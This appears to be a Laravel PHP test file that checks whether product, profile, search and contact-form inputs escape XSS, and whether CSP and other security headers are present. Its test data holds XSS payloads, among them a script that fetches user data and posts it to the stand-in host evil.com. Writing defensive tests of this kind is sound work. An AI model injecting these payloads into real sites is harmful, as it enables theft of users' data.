<?php

namespace Tests\Security;

use Tests\TestCase;
use App\Models\User;
use App\Models\Product;
use Illuminate\Foundation\Testing\RefreshDatabase;

class XssPreventionTest extends TestCase
{
    use RefreshDatabase;

    /**
     * Test XSS prevention in product creation
     */
    public function test_product_creation_prevents_xss(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user);

        $maliciousData = [
            'name' => '<script>alert("XSS")</script>Product Name',
            'description' => '<img src="x" onerror="alert(\'XSS\')">Description',
            'price' => 100,
            'category_id' => 1
        ];

        $response = $this->post('/products', $maliciousData);

        $response->assertStatus(302); // Redirect after creation
        
        $product = Product::latest()->first();
        
        // Assert that malicious scripts are escaped
        $this->assertStringNotContainsString('<script>', $product->name);
        $this->assertStringNotContainsString('onerror=', $product->description);
        $this->assertStringContainsString('&lt;script&gt;', $product->name);
    }

    /**
     * Test XSS prevention in product updates
     */
    public function test_product_update_prevents_xss(): void
    {
        $user = User::factory()->create();
        $product = Product::factory()->create(['user_id' => $user->id]);
        
        $this->actingAs($user);

        $maliciousData = [
            'name' => '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            'description' => '<svg onload="alert(\'XSS\')"></svg>'
        ];

        $response = $this->put("/products/{$product->id}", $maliciousData);

        $response->assertStatus(302);
        
        $product->refresh();
        
        // Assert that malicious content is escaped
        $this->assertStringNotContainsString('<iframe', $product->name);
        $this->assertStringNotContainsString('onload=', $product->description);
    }

    /**
     * Test XSS prevention in user profile updates
     */
    public function test_user_profile_update_prevents_xss(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user);

        $maliciousData = [
            'name' => '<script>document.location="http://evil.com"</script>',
            'bio' => '<object data="javascript:alert(\'XSS\')"></object>'
        ];

        $response = $this->put('/profile', $maliciousData);

        $response->assertStatus(302);
        
        $user->refresh();
        
        // Assert that malicious scripts are escaped
        $this->assertStringNotContainsString('<script>', $user->name);
        $this->assertStringNotContainsString('javascript:', $user->bio);
    }

    /**
     * Test XSS prevention in search functionality
     */
    public function test_search_prevents_xss(): void
    {
        $maliciousQuery = '<script>alert("XSS")</script>';

        $response = $this->get('/search?q=' . urlencode($maliciousQuery));

        $response->assertStatus(200);
        $response->assertDontSee('<script>alert("XSS")</script>');
        $response->assertSee('&lt;script&gt;');
    }

    /**
     * Test XSS prevention in form submissions
     */
    public function test_form_submission_prevents_xss(): void
    {
        $user = User::factory()->create();
        $this->actingAs($user);

        $maliciousData = [
            'message' => '<script>fetch("/api/user-data").then(r=>r.json()).then(d=>fetch("http://evil.com",{method:"POST",body:JSON.stringify(d)}))</script>'
        ];

        $response = $this->post('/contact', $maliciousData);

        $response->assertStatus(302);
        
        // Assert that the malicious script is not stored as-is
        $this->assertDatabaseMissing('contact_messages', [
            'message' => $maliciousData['message']
        ]);
    }

    /**
     * Test CSP headers are present
     */
    public function test_csp_headers_are_present(): void
    {
        $response = $this->get('/');

        $response->assertHeader('Content-Security-Policy');
        
        $csp = $response->headers->get('Content-Security-Policy');
        
        // Assert that unsafe-eval is not allowed
        $this->assertStringNotContainsString("'unsafe-eval'", $csp);
        
        // Assert that object-src is set to 'none'
        $this->assertStringContainsString("object-src 'none'", $csp);
        
        // Assert that frame-ancestors is set to 'none'
        $this->assertStringContainsString("frame-ancestors 'none'", $csp);
    }

    /**
     * Test security headers are present
     */
    public function test_security_headers_are_present(): void
    {
        $response = $this->get('/');

        $response->assertHeader('X-Content-Type-Options', 'nosniff');
        $response->assertHeader('X-Frame-Options', 'DENY');
        $response->assertHeader('X-XSS-Protection', '1; mode=block');
        $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
    }
}
